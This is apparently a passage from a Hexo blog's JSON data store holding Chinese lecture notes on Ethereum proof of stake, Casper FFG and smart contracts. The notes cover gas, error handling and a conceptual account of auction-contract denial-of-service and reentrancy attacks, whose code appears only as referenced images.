title=\"投票\"></a>投票</h3><ul>\n<li>50个区块投票一次.</li>\n<li>每个epoch投一次票。</li>\n<li>这一次投票对于上一个epoch来说是准备的投票。</li>\n<li>对于这一个epoch来说是提交的投票。</li>\n<li>获取两个投票2&#x2F;3以上的投票资金支持才可以。</li>\n</ul>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><h4 id=\"投票的Finality会不会被推翻\"><a href=\"#投票的Finality会不会被推翻\" class=\"headerlink\" title=\"投票的Finality会不会被推翻\"></a>投票的Finality会不会被推翻</h4><ul>\n<li>至少有1&#x2F;3的验证者进行两边押注。</li>\n</ul>\n<h4 id=\"为什么不开始就用权益证明\"><a href=\"#为什么不开始就用权益证明\" class=\"headerlink\" title=\"为什么不开始就用权益证明\"></a>为什么不开始就用权益证明</h4><ul>\n<li>bug bounty</li>\n</ul>\n<h2 id=\"EOS-DPOS\"><a href=\"#EOS-DPOS\" class=\"headerlink\" title=\"EOS(DPOS)\"></a>EOS(DPOS)</h2><ul>\n<li>选取超级节点进行投票。</li>\n</ul>\n<h2 id=\"挖矿的实际作用\"><a href=\"#挖矿的实际作用\" class=\"headerlink\" title=\"挖矿的实际作用\"></a>挖矿的实际作用</h2><ul>\n<li>可以以货币形式存储过剩的电能。</li>\n<li>但是进行的是无用功操作，浪费资源。</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"工作量证明能耗太高\"><a href=\"#工作量证明能耗太高\" class=\"headerlink\" title=\"工作量证明能耗太高\"></a>工作量证明能耗太高</h2><h3 id=\"ETH每笔能耗小于BTC\"><a href=\"#ETH每笔能耗小于BTC\" class=\"headerlink\" title=\"ETH每笔能耗小于BTC\"></a>ETH每笔能耗小于BTC</h3><ul>\n<li>由于ETH出块速度快。</li>\n<li>平均下来消耗能耗就会小一点。</li>\n</ul>\n<h1 id=\"原来是工作量证明\"><a href=\"#原来是工作量证明\" class=\"headerlink\" title=\"原来是工作量证明\"></a>原来是工作量证明</h1><h1 id=\"POS-权益证明\"><a href=\"#POS-权益证明\" class=\"headerlink\" title=\"POS(权益证明)\"></a>POS(权益证明)</h1><ul>\n<li>需要51%的币才有攻击的可能。</li>\n</ul>\n<h1 id=\"Proof-of-Deposit\"><a href=\"#Proof-of-Deposit\" class=\"headerlink\" title=\"Proof of Deposit\"></a>Proof of Deposit</h1><h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><ul>\n<li>可以通过币来进行降低挖矿难度。</li>\n<li>威胁是币越多的人越容易挖矿。</li>\n<li>通过对于投入降低难度的币进行时间锁定。</li>\n</ul>\n<h2 id=\"遇到的问题\"><a href=\"#遇到的问题\" class=\"headerlink\" title=\"遇到的问题\"></a>遇到的问题</h2><ul>\n<li>两头下注，在两条链上投入相同的币进行挖矿。</li>\n</ul>\n<h2 id=\"Casper-the-Friendly-Finality-Gadest-FFG\"><a href=\"#Casper-the-Friendly-Finality-Gadest-FFG\" class=\"headerlink\" title=\"Casper the Friendly  Finality Gadest(FFG)\"></a>Casper the Friendly  Finality Gadest(FFG)</h2><h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ul>\n<li>不会出现回滚，确认最长连。</li>\n</ul>\n<h3 id=\"验证者（Validator）\"><a href=\"#验证者（Validator）\" class=\"headerlink\" title=\"验证者（Validator）\"></a>验证者（Validator）</h3><ul>\n<li>投入一定数量的以太币作为质押。</li>\n<li>权重与投入的币数量正比。</li>\n<li>币会被锁定。</li>\n<li>不投票会被罚一定数量的以太币。</li>\n<li>乱投不符合规则的票，会被没收投入的以太币，并销毁。</li>\n<li>有任期。</li>\n<li>任期结束后进行等待期，进行等待其他的检举揭发，进行惩处。</li>\n<li></li>\n</ul>\n<h3 id=\"投票\"><a href=\"#投票\" class=\"headerlink\" title=\"投票\"></a>投票</h3><ul>\n<li>50个区块投票一次.</li>\n<li>每个epoch投一次票。</li>\n<li>这一次投票对于上一个epoch来说是准备的投票。</li>\n<li>对于这一个epoch来说是提交的投票。</li>\n<li>获取两个投票2&#x2F;3以上的投票资金支持才可以。</li>\n</ul>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><h4 id=\"投票的Finality会不会被推翻\"><a href=\"#投票的Finality会不会被推翻\" class=\"headerlink\" title=\"投票的Finality会不会被推翻\"></a>投票的Finality会不会被推翻</h4><ul>\n<li>至少有1&#x2F;3的验证者进行两边押注。</li>\n</ul>\n<h4 id=\"为什么不开始就用权益证明\"><a href=\"#为什么不开始就用权益证明\" class=\"headerlink\" title=\"为什么不开始就用权益证明\"></a>为什么不开始就用权益证明</h4><ul>\n<li>bug bounty</li>\n</ul>\n<h2 id=\"EOS-DPOS\"><a href=\"#EOS-DPOS\" class=\"headerlink\" title=\"EOS(DPOS)\"></a>EOS(DPOS)</h2><ul>\n<li>选取超级节点进行投票。</li>\n</ul>\n<h2 id=\"挖矿的实际作用\"><a href=\"#挖矿的实际作用\" class=\"headerlink\" title=\"挖矿的实际作用\"></a>挖矿的实际作用</h2><ul>\n<li>可以以货币形式存储过剩的电能。</li>\n<li>但是进行的是无用功操作，浪费资源。</li>\n</ul>\n"},{"title":"09-ETH-智能合约","date":"2024-07-31T15:51:45.000Z","_content":"\n# 智能合约\n\n## 特点\n\n- 可执行代码。\n## 编程特点\n![](../pic/Pasted%20image%2020240731154908.png)\n\n![](../pic/Pasted%20image%2020240731155038.png)\n\n- 不知支持对于哈希表进行遍历。\n- 构造函数只能有一个。\n- 调用函数放在data域中。\n- 接受转账的函数需要设置为payable类型。\n- 竞标的函数通过叫价把自己的以太币放在合约里面锁定。\n- withdraw函数撤回以太币函数。\n\n## 合约调用另一个合约函数\n\n### 直接调用\n![](../pic/Pasted%20image%2020240731155254.png)\n\n\n- 被调用出现错误，调用者也出现错误。\n\n### 使用address类型进行调用\n![](../pic/Pasted%20image%2020240731155404.png)\n\n\n- 被调用函数异常，调用者会继续执行。\n### 代理调用\n![](../pic/Pasted%20image%2020240731162336.png)\n\n\n- 在当前环境执行被调用函数。\n\n## 特殊函数\n\n### fallback()函数\n![](../pic/Pasted%20image%2020240731162647.png)\n\n\n- 默认保底调用函数在data域中。\n- 合约接受转账。\n- 调用的合约函数不存在。\n- 为了填充data域。\n\n\n## 创建与运行\n\n### 创建\n\n- 写代码，进行编译为bytecode形式。\n- 创建合约：通过向0x00地址发起0ETH的转账交易。\n- 代码放在data域中，并且支付一定的gas fee.\n\n### 运行\n\n- 智能合约运行在EVM上。\n- EVM提供一个统一的运行平台。\n- 以太坊是一个交易驱动的状态机，要确定每个账户的状态。\n- 调用智能合约的交易发布到区块上，每个矿工都会执行这个交易。\n- 为了进行确定性的状态转移。\n\n## gas fee\n\n- 图灵完备系统。\n- 出现死循环是halting problem。\n- 执行合约收取gas fee，由发起人来支付。\n-  gas limit是最大限度的数据可用的gas 费用。\n- 先提取最大gas fee,多余大的再返回。\n- 少的话就就会回滚，退回到执行之前的状态。\n- 简单指令是便宜的，复杂的或者需要存储状态的指令很贵。\n- 读取公共数据是免费的。\n- 运行错误也会返回，运行的消耗的gas fee是不退回的，避免拒绝服务攻击。\n### 扣费原理\n\n- 状态数、交易树、收据树，都在本地维护。\n- 先在本地进行扣除最大gas 费用，不够不执行。\n- 执行完了加回多余的费用。\n## 错误处理\n\n### 不存在处理错误的操作。\n\n### assert(bool condition)\n- 不满足条件就会抛出错误。\n- 用于内部的错误。\n### require(bool condition)\n- 不满足条件就抛出错误。\n- 用于输入或者外部的组件引起的错误。\n### revert(){throw()}\n- 直接终止运行并进行回滚。\n\n### 嵌套调用\n\n- 合约的执行具有原子性。\n- 一个合约调用另一个合约的函数。\n- 通过直接调用的方式会出现连锁回滚。\n- 通过address类型调用域代理调用不会混滚调用者的合约。\n- 转账默认调用fallback函数，也会进行嵌套调用。\n\n## 区块发布\n\n### 先执行再挖矿\n- 先获取三棵树的根哈希值。\n### 消耗资源的节点获得什么补偿\n- 没有补偿，还要验证交易的合法性与区块的同步性。\n### 会不会不给汽油费不验证\n- 危害区块链安全，就相当于不干了。\n- 发新的区块时别人不认，相当于无效挖矿。\n- 可以抄别人的信息。\n\n### 发布到区块链的交易是不是都是成功执行的\n- 也要发布，需要扣汽油费。\n- 要不然无法扣汽油费。\n#### 收据树\n![](../pic/Pasted%20image%2020240731184932.png)\n\n\n### 智能合约支不支持多核并行处理\n- 不支持多线程。\n- 状态转换是确定性的。\n- 多线程会导致结果不同。 \n- 产生随机数也不支持。\n- 使用的是伪随机数。\n\n#### 智能合约可以得到区块的信息\n![](../pic/Pasted%20image%2020240731185943.png)\n\n\n#### 智能合约可以获得调用的信息\n![](../pic/Pasted%20image%2020240731190048.png)\n\n\n- message.data：发起的合约函数。\n- tx.origin：交易或者调用的最终发起者。\n\n### 地址类型\n![](../pic/Pasted%20image%2020240731190411.png)\n\n\n- address.transfer(amount)：转入函数。\n- address.send：发送交易。\n\n#### 转账的三种方式\n\n##### transfer\n- 专门转账的。\n- 失败就抛出异常，引起连锁回滚。\n- 汽油费少。\n##### send\n- 专门转账函数。\n- 失败返回false。\n- 汽油费少。\n##### call.value\n- 也不会引起失败连锁反应。\n- 把本来剩下的所有汽油费都发给执行节点。\n\n\n## 拍卖合约\n\n### 主合约\n![](../pic/Pasted%20image%2020240731154908.png)\n\n\n### 竞拍合约函数\n![](../pic/Pasted%20image%2020240731191813.png)\n\n\n### 结束竞拍函数\n![](../pic/Pasted%20image%2020240731191946.png)\n\n\n\n### 攻击\n\n#### 攻击合约\n![](../pic/Pasted%20image%2020240731193147.png)\n\n\n### 攻击过程\n\n- 在黑客调用这个黑客合约函数时，会进行竞拍。\n- 把黑客发送的竞拍币都发给竞拍函数。\n- 在竞拍结束后，要返回非最高出价人的钱时。\n- 找不到黑客合约的fallback函数，转账失败。\n- 且用的是tranfer进行的转账回去，就会出现合约执行错误。\n- 所有人都无法获得发出的拍卖资金。\n- 无法补救。\n- code is law.\n\n### 修改合约函数\n\n#### 拍卖结束撤回资金\n![](../pic/Pasted%20image%2020240731193958.png)\n\n\n#### 给受益人转钱\n![](../pic/Pasted%20image%2020240731194050.png)\n\n\n#### 黑客合约\n![](../pic/Pasted%20image%2020240731195121.png)\n\n- 通过fallback一直进行递归调用转账.\n- 合约没钱了.\n- 汽油费不够了.\n- 调用栈超限.","source":"_posts/09-ETH-智能合约.md","raw":"---\ntitle: 09-ETH-智能合约\ndate: 2024-07-31 23:51:45\ntags:\n  - BlockChain\n  - ETH\ncategories:\n  - BlockChain\n  - ETH\n---\n\n# 智能合约\n\n## 特点\n\n- 可执行代码。\n## 编程特点\n![](../pic/Pasted%20image%2020240731154908.png)\n\n![](../pic/Pasted%20image%2020240731155038.png)\n\n- 不知支持对于哈希表进行遍历。\n- 构造函数只能有一个。\n- 调用函数放在data域中。\n- 接受转账的函数需要设置为payable类型。\n- 竞标的函数通过叫价把自己的以太币放在合约里面锁定。\n- withdraw函数撤回以太币函数。\n\n## 合约调用另一个合约函数\n\n### 直接调用\n![](../pic/Pasted%20image%2020240731155254.png)\n\n\n- 被调用出现错误，调用者也出现错误。\n\n### 使用address类型进行调用\n![](../pic/Pasted%20image%2020240731155404.png)\n\n\n- 被调用函数异常，调用者会继续执行。\n### 代理调用\n![](../pic/Pasted%20image%2020240731162336.png)\n\n\n- 在当前环境执行被调用函数。\n\n## 特殊函数\n\n### fallback()函数\n![](../pic/Pasted%20image%2020240731162647.png)\n\n\n- 默认保底调用函数在data域中。\n- 合约接受转账。\n- 调用的合约函数不存在。\n- 为了填充data域。\n\n\n## 创建与运行\n\n### 创建\n\n- 写代码，进行编译为bytecode形式。\n- 创建合约：通过向0x00地址发起0ETH的转账交易。\n- 代码放在data域中，并且支付一定的gas fee.\n\n### 运行\n\n- 智能合约运行在EVM上。\n- EVM提供一个统一的运行平台。\n- 以太坊是一个交易驱动的状态机，要确定每个账户的状态。\n- 调用智能合约的交易发布到区块上，每个矿工都会执行这个交易。\n- 为了进行确定性的状态转移。\n\n## gas fee\n\n- 图灵完备系统。\n- 出现死循环是halting problem。\n- 执行合约收取gas fee，由发起人来支付。\n-  gas limit是最大限度的数据可用的gas 费用。\n- 先提取最大gas fee,多余大的再返回。\n- 少的话就就会回滚，退回到执行之前的状态。\n- 简单指令是便宜的，复杂的或者需要存储状态的指令很贵。\n- 读取公共数据是免费的。\n- 运行错误也会返回，运行的消耗的gas fee是不退回的，避免拒绝服务攻击。\n### 扣费原理\n\n- 状态数、交易树、收据树，都在本地维护。\n- 先在本地进行扣除最大gas 费用，不够不执行。\n- 执行完了加回多余的费用。\n## 错误处理\n\n### 不存在处理错误的操作。\n\n### assert(bool condition)\n- 不满足条件就会抛出错误。\n- 用于内部的错误。\n### require(bool condition)\n- 不满足条件就抛出错误。\n- 用于输入或者外部的组件引起的错误。\n### revert(){throw()}\n- 直接终止运行并进行回滚。\n\n### 嵌套调用\n\n- 合约的执行具有原子性。\n- 一个合约调用另一个合约的函数。\n- 通过直接调用的方式会出现连锁回滚。\n- 通过address类型调用域代理调用不会混滚调用者的合约。\n- 转账默认调用fallback函数，也会进行嵌套调用。\n\n## 区块发布\n\n### 先执行再挖矿\n- 先获取三棵树的根哈希值。\n### 消耗资源的节点获得什么补偿\n- 没有补偿，还要验证交易的合法性与区块的同步性。\n### 会不会不给汽油费不验证\n- 危害区块链安全，就相当于不干了。\n- 发新的区块时别人不认，相当于无效挖矿。\n- 可以抄别人的信息。\n\n### 发布到区块链的交易是不是都是成功执行的\n- 也要发布，需要扣汽油费。\n- 要不然无法扣汽油费。\n#### 收据树\n![](../pic/Pasted%20image%2020240731184932.png)\n\n\n### 智能合约支不支持多核并行处理\n- 不支持多线程。\n- 状态转换是确定性的。\n- 多线程会导致结果不同。 \n- 产生随机数也不支持。\n- 使用的是伪随机数。\n\n#### 智能合约可以得到区块的信息\n![](../pic/Pasted%20image%2020240731185943.png)\n\n\n#### 智能合约可以获得调用的信息\n![](../pic/Pasted%20image%2020240731190048.png)\n\n\n- message.data：发起的合约函数。\n- tx.origin：交易或者调用的最终发起者。\n\n### 地址类型\n![](../pic/Pasted%20image%2020240731190411.png)\n\n\n- address.transfer(amount)：转入函数。\n- address.send：发送交易。\n\n#### 转账的三种方式\n\n##### transfer\n- 专门转账的。\n- 失败就抛出异常，引起连锁回滚。\n- 汽油费少。\n##### send\n- 专门转账函数。\n- 失败返回false。\n- 汽油费少。\n##### call.value\n- 也不会引起失败连锁反应。\n- 把本来剩下的所有汽油费都发给执行节点。\n\n\n## 拍卖合约\n\n### 主合约\n![](../pic/Pasted%20image%2020240731154908.png)\n\n\n### 竞拍合约函数\n![](../pic/Pasted%20image%2020240731191813.png)\n\n\n### 结束竞拍函数\n![](../pic/Pasted%20image%2020240731191946.png)\n\n\n\n### 攻击\n\n#### 攻击合约\n![](../pic/Pasted%20image%2020240731193147.png)\n\n\n### 攻击过程\n\n- 在黑客调用这个黑客合约函数时，会进行竞拍。\n- 把黑客发送的竞拍币都发给竞拍函数。\n- 在竞拍结束后，要返回非最高出价人的钱时。\n- 找不到黑客合约的fallback函数，转账失败。\n- 且用的是tranfer进行的转账回去，就会出现合约执行错误。\n- 所有人都无法获得发出的拍卖资金。\n- 无法补救。\n- code is law.\n\n### 修改合约函数\n\n#### 拍卖结束撤回资金\n![](../pic/Pasted%20image%2020240731193958.png)\n\n\n#### 给受益人转钱\n![](../pic/Pasted%20image%2020240731194050.png)\n\n\n#### 黑客合约\n![](../pic/Pasted%20image%2020240731195121.png)\n\n- 通过fallback一直进行递归调用转账.\n- 合约没钱了.\n- 汽油费不够了.\n- 调用栈超限.","slug":"09-ETH-智能合约","published":1,"updated":"2024-07-31T15:54:05.997Z","comments":1,"layout":"post","photos":[],"_id":"clza14odd000184un9na7518i","content":"<h1 id=\"智能合约\"><a href=\"#智能合约\" class=\"headerlink\" title=\"智能合约\"></a>智能合约</h1><h2 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h2><ul>\n<li>可执行代码。</li>\n</ul>\n<h2 id=\"编程特点\"><a href=\"#编程特点\" class=\"headerlink\" title=\"编程特点\"></a>编程特点</h2><p><img src=\"/../pic/Pasted%20image%2020240731154908.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240731155038.png\"></p>\n<ul>\n<li>不知支持对于哈希表进行遍历。</li>\n<li>构造函数只能有一个。</li>\n<li>调用函数放在data域中。</li>\n<li>接受转账的函数需要设置为payable类型。</li>\n<li>竞标的函数通过叫价把自己的以太币放在合约里面锁定。</li>\n<li>withdraw函数撤回以太币函数。</li>\n</ul>\n<h2 id=\"合约调用另一个合约函数\"><a href=\"#合约调用另一个合约函数\" class=\"headerlink\" title=\"合约调用另一个合约函数\"></a>合约调用另一个合约函数</h2><h3 id=\"直接调用\"><a href=\"#直接调用\" class=\"headerlink\" title=\"直接调用\"></a>直接调用</h3><p><img src=\"/../pic/Pasted%20image%2020240731155254.png\"></p>\n<ul>\n<li>被调用出现错误，调用者也出现错误。</li>\n</ul>\n<h3 id=\"使用address类型进行调用\"><a href=\"#使用address类型进行调用\" class=\"headerlink\" title=\"使用address类型进行调用\"></a>使用address类型进行调用</h3><p><img src=\"/../pic/Pasted%20image%2020240731155404.png\"></p>\n<ul>\n<li>被调用函数异常，调用者会继续执行。</li>\n</ul>\n<h3 id=\"代理调用\"><a href=\"#代理调用\" class=\"headerlink\" title=\"代理调用\"></a>代理调用</h3><p><img src=\"/../pic/Pasted%20image%2020240731162336.png\"></p>\n<ul>\n<li>在当前环境执行被调用函数。</li>\n</ul>\n<h2 id=\"特殊函数\"><a href=\"#特殊函数\" class=\"headerlink\" title=\"特殊函数\"></a>特殊函数</h2><h3 id=\"fallback-函数\"><a href=\"#fallback-函数\" class=\"headerlink\" title=\"fallback()函数\"></a>fallback()函数</h3><p><img src=\"/../pic/Pasted%20image%2020240731162647.png\"></p>\n<ul>\n<li>默认保底调用函数在data域中。</li>\n<li>合约接受转账。</li>\n<li>调用的合约函数不存在。</li>\n<li>为了填充data域。</li>\n</ul>\n<h2 id=\"创建与运行\"><a href=\"#创建与运行\" class=\"headerlink\" title=\"创建与运行\"></a>创建与运行</h2><h3 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h3><ul>\n<li>写代码，进行编译为bytecode形式。</li>\n<li>创建合约：通过向0x00地址发起0ETH的转账交易。</li>\n<li>代码放在data域中，并且支付一定的gas fee.</li>\n</ul>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><ul>\n<li>智能合约运行在EVM上。</li>\n<li>EVM提供一个统一的运行平台。</li>\n<li>以太坊是一个交易驱动的状态机，要确定每个账户的状态。</li>\n<li>调用智能合约的交易发布到区块上，每个矿工都会执行这个交易。</li>\n<li>为了进行确定性的状态转移。</li>\n</ul>\n<h2 id=\"gas-fee\"><a href=\"#gas-fee\" class=\"headerlink\" title=\"gas fee\"></a>gas fee</h2><ul>\n<li>图灵完备系统。</li>\n<li>出现死循环是halting problem。</li>\n<li>执行合约收取gas fee，由发起人来支付。</li>\n<li>gas limit是最大限度的数据可用的gas 费用。</li>\n<li>先提取最大gas fee,多余大的再返回。</li>\n<li>少的话就就会回滚，退回到执行之前的状态。</li>\n<li>简单指令是便宜的，复杂的或者需要存储状态的指令很贵。</li>\n<li>读取公共数据是免费的。</li>\n<li>运行错误也会返回，运行的消耗的gas fee是不退回的，避免拒绝服务攻击。</li>\n</ul>\n<h3 id=\"扣费原理\"><a href=\"#扣费原理\" class=\"headerlink\" title=\"扣费原理\"></a>扣费原理</h3><ul>\n<li>状态数、交易树、收据树，都在本地维护。</li>\n<li>先在本地进行扣除最大gas 费用，不够不执行。</li>\n<li>执行完了加回多余的费用。</li>\n</ul>\n<h2 id=\"错误处理\"><a href=\"#错误处理\" class=\"headerlink\" title=\"错误处理\"></a>错误处理</h2><h3 id=\"不存在处理错误的操作。\"><a href=\"#不存在处理错误的操作。\" class=\"headerlink\" title=\"不存在处理错误的操作。\"></a>不存在处理错误的操作。</h3><h3 id=\"assert-bool-condition\"><a href=\"#assert-bool-condition\" class=\"headerlink\" title=\"assert(bool condition)\"></a>assert(bool condition)</h3><ul>\n<li>不满足条件就会抛出错误。</li>\n<li>用于内部的错误。</li>\n</ul>\n<h3 id=\"require-bool-condition\"><a href=\"#require-bool-condition\" class=\"headerlink\" title=\"require(bool condition)\"></a>require(bool condition)</h3><ul>\n<li>不满足条件就抛出错误。</li>\n<li>用于输入或者外部的组件引起的错误。</li>\n</ul>\n<h3 id=\"revert-throw\"><a href=\"#revert-throw\" class=\"headerlink\" title=\"revert(){throw()}\"></a>revert(){throw()}</h3><ul>\n<li>直接终止运行并进行回滚。</li>\n</ul>\n<h3 id=\"嵌套调用\"><a href=\"#嵌套调用\" class=\"headerlink\" title=\"嵌套调用\"></a>嵌套调用</h3><ul>\n<li>合约的执行具有原子性。</li>\n<li>一个合约调用另一个合约的函数。</li>\n<li>通过直接调用的方式会出现连锁回滚。</li>\n<li>通过address类型调用域代理调用不会混滚调用者的合约。</li>\n<li>转账默认调用fallback函数，也会进行嵌套调用。</li>\n</ul>\n<h2 id=\"区块发布\"><a href=\"#区块发布\" class=\"headerlink\" title=\"区块发布\"></a>区块发布</h2><h3 id=\"先执行再挖矿\"><a href=\"#先执行再挖矿\" class=\"headerlink\" title=\"先执行再挖矿\"></a>先执行再挖矿</h3><ul>\n<li>先获取三棵树的根哈希值。</li>\n</ul>\n<h3 id=\"消耗资源的节点获得什么补偿\"><a href=\"#消耗资源的节点获得什么补偿\" class=\"headerlink\" title=\"消耗资源的节点获得什么补偿\"></a>消耗资源的节点获得什么补偿</h3><ul>\n<li>没有补偿，还要验证交易的合法性与区块的同步性。</li>\n</ul>\n<h3 id=\"会不会不给汽油费不验证\"><a href=\"#会不会不给汽油费不验证\" class=\"headerlink\" title=\"会不会不给汽油费不验证\"></a>会不会不给汽油费不验证</h3><ul>\n<li>危害区块链安全，就相当于不干了。</li>\n<li>发新的区块时别人不认，相当于无效挖矿。</li>\n<li>可以抄别人的信息。</li>\n</ul>\n<h3 id=\"发布到区块链的交易是不是都是成功执行的\"><a href=\"#发布到区块链的交易是不是都是成功执行的\" class=\"headerlink\" title=\"发布到区块链的交易是不是都是成功执行的\"></a>发布到区块链的交易是不是都是成功执行的</h3><ul>\n<li>也要发布，需要扣汽油费。</li>\n<li>要不然无法扣汽油费。</li>\n</ul>\n<h4 id=\"收据树\"><a href=\"#收据树\" class=\"headerlink\" title=\"收据树\"></a>收据树</h4><p><img src=\"/../pic/Pasted%20image%2020240731184932.png\"></p>\n<h3 id=\"智能合约支不支持多核并行处理\"><a href=\"#智能合约支不支持多核并行处理\" class=\"headerlink\" title=\"智能合约支不支持多核并行处理\"></a>智能合约支不支持多核并行处理</h3><ul>\n<li>不支持多线程。</li>\n<li>状态转换是确定性的。</li>\n<li>多线程会导致结果不同。 </li>\n<li>产生随机数也不支持。</li>\n<li>使用的是伪随机数。</li>\n</ul>\n<h4 id=\"智能合约可以得到区块的信息\"><a href=\"#智能合约可以得到区块的信息\" class=\"headerlink\" title=\"智能合约可以得到区块的信息\"></a>智能合约可以得到区块的信息</h4><p><img src=\"/../pic/Pasted%20image%2020240731185943.png\"></p>\n<h4 id=\"智能合约可以获得调用的信息\"><a href=\"#智能合约可以获得调用的信息\" class=\"headerlink\" title=\"智能合约可以获得调用的信息\"></a>智能合约可以获得调用的信息</h4><p><img src=\"/../pic/Pasted%20image%2020240731190048.png\"></p>\n<ul>\n<li>message.data：发起的合约函数。</li>\n<li>tx.origin：交易或者调用的最终发起者。</li>\n</ul>\n<h3 id=\"地址类型\"><a href=\"#地址类型\" class=\"headerlink\" title=\"地址类型\"></a>地址类型</h3><p><img src=\"/../pic/Pasted%20image%2020240731190411.png\"></p>\n<ul>\n<li>address.transfer(amount)：转入函数。</li>\n<li>address.send：发送交易。</li>\n</ul>\n<h4 id=\"转账的三种方式\"><a href=\"#转账的三种方式\" class=\"headerlink\" title=\"转账的三种方式\"></a>转账的三种方式</h4><h5 id=\"transfer\"><a href=\"#transfer\" class=\"headerlink\" title=\"transfer\"></a>transfer</h5><ul>\n<li>专门转账的。</li>\n<li>失败就抛出异常，引起连锁回滚。</li>\n<li>汽油费少。</li>\n</ul>\n<h5 id=\"send\"><a href=\"#send\" class=\"headerlink\" title=\"send\"></a>send</h5><ul>\n<li>专门转账函数。</li>\n<li>失败返回false。</li>\n<li>汽油费少。</li>\n</ul>\n<h5 id=\"call-value\"><a href=\"#call-value\" class=\"headerlink\" title=\"call.value\"></a>call.value</h5><ul>\n<li>也不会引起失败连锁反应。</li>\n<li>把本来剩下的所有汽油费都发给执行节点。</li>\n</ul>\n<h2 id=\"拍卖合约\"><a href=\"#拍卖合约\" class=\"headerlink\" title=\"拍卖合约\"></a>拍卖合约</h2><h3 id=\"主合约\"><a href=\"#主合约\" class=\"headerlink\" title=\"主合约\"></a>主合约</h3><p><img src=\"/../pic/Pasted%20image%2020240731154908.png\"></p>\n<h3 id=\"竞拍合约函数\"><a href=\"#竞拍合约函数\" class=\"headerlink\" title=\"竞拍合约函数\"></a>竞拍合约函数</h3><p><img src=\"/../pic/Pasted%20image%2020240731191813.png\"></p>\n<h3 id=\"结束竞拍函数\"><a href=\"#结束竞拍函数\" class=\"headerlink\" title=\"结束竞拍函数\"></a>结束竞拍函数</h3><p><img src=\"/../pic/Pasted%20image%2020240731191946.png\"></p>\n<h3 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h3><h4 id=\"攻击合约\"><a href=\"#攻击合约\" class=\"headerlink\" title=\"攻击合约\"></a>攻击合约</h4><p><img src=\"/../pic/Pasted%20image%2020240731193147.png\"></p>\n<h3 id=\"攻击过程\"><a href=\"#攻击过程\" class=\"headerlink\" title=\"攻击过程\"></a>攻击过程</h3><ul>\n<li>在黑客调用这个黑客合约函数时，会进行竞拍。</li>\n<li>把黑客发送的竞拍币都发给竞拍函数。</li>\n<li>在竞拍结束后，要返回非最高出价人的钱时。</li>\n<li>找不到黑客合约的fallback函数，转账失败。</li>\n<li>且用的是tranfer进行的转账回去，就会出现合约执行错误。</li>\n<li>所有人都无法获得发出的拍卖资金。</li>\n<li>无法补救。</li>\n<li>code is law.</li>\n</ul>\n<h3 id=\"修改合约函数\"><a href=\"#修改合约函数\" class=\"headerlink\" title=\"修改合约函数\"></a>修改合约函数</h3><h4 id=\"拍卖结束撤回资金\"><a href=\"#拍卖结束撤回资金\" class=\"headerlink\" title=\"拍卖结束撤回资金\"></a>拍卖结束撤回资金</h4><p><img src=\"/../pic/Pasted%20image%2020240731193958.png\"></p>\n<h4 id=\"给受益人转钱\"><a href=\"#给受益人转钱\" class=\"headerlink\" title=\"给受益人转钱\"></a>给受益人转钱</h4><p><img src=\"/../pic/Pasted%20image%2020240731194050.png\"></p>\n<h4 id=\"黑客合约\"><a href=\"#黑客合约\" class=\"headerlink\" title=\"黑客合约\"></a>黑客合约</h4><p><img src=\"/../pic/Pasted%20image%2020240731195121.png\"></p>\n<ul>\n<li>通过fallback一直进行递归调用转账.</li>\n<li>合约没钱了.</li>\n<li>汽油费不够了.</li>\n<li>调用栈超限.</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"智能合约\"><a href=\"#智能合约\" class=\"headerlink\" title=\"智能合约\"></a>智能合约</h1><h2 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h2><ul>\n<li>可执行代码。</li>\n</ul>\n<h2 id=\"编程特点\"><a href=\"#编程特点\" class=\"headerlink\" title=\"编程特点\"></a>编程特点</h2><p><img src=\"/../pic/Pasted%20image%2020240731154908.png\"></p>\n<p><img src=\"/../pic/Pasted%20image%2020240731155038.png\"></p>\n<ul>\n<li>不知支持对于哈希表进行遍历。</li>\n<li>构造函数只能有一个。</li>\n<li>调用函数放在data域中。</li>\n<li>接受转账的函数需要设置为payable类型。</li>\n<li>竞标的函数通过叫价把自己的以太币放在合约里面锁定。</li>\n<li>withdraw函数撤回以太币函数。</li>\n</ul>\n<h2 id=\"合约调用另一个合约函数\"><a href=\"#合约调用另一个合约函数\" class=\"headerlink\" title=\"合约调用另一个合约函数\"></a>合约调用另一个合约函数</h2><h3 id=\"直接调用\"><a href=\"#直接调用\" class=\"headerlink\" title=\"直接调用\"></a>直接调用</h3><p><img src=\"/../pic/Pasted%20image%2020240731155254.png\"></p>\n<ul>\n<li>被调用出现错误，调用者也出现错误。</li>\n</ul>\n<h3 id=\"使用address类型进行调用\"><a href=\"#使用address类型进行调用\" class=\"headerlink\" title=\"使用address类型进行调用\"></a>使用address类型进行调用</h3><p><img src=\"/../pic/Pasted%20image%2020240731155404.png\"></p>\n<ul>\n<li>被调用函数异常，调用者会继续执行。</li>\n</ul>\n<h3 id=\"代理调用\"><a href=\"#代理调用\" class=\"headerlink\" title=\"代理调用\"></a>代理调用</h3><p><img src=\"/../pic/Pasted%20image%2020240731162336.png\"></p>\n<ul>\n<li>在当前环境执行被调用函数。</li>\n</ul>\n<h2 id=\"特殊函数\"><a href=\"#特殊函数\" class=\"headerlink\" title=\"特殊函数\"></a>特殊函数</h2><h3 id=\"fallback-函数\"><a href=\"#fallback-函数\" class=\"headerlink\" title=\"fallback()函数\"></a>fallback()函数</h3><p><img src=\"/../pic/Pasted%20image%2020240731162647.png\"></p>\n<ul>\n<li>默认保底调用函数在data域中。</li>\n<li>合约接受转账。</li>\n<li>调用的合约函数不存在。</li>\n<li>为了填充data域。</li>\n</ul>\n<h2 id=\"创建与运行\"><a href=\"#创建与运行\" 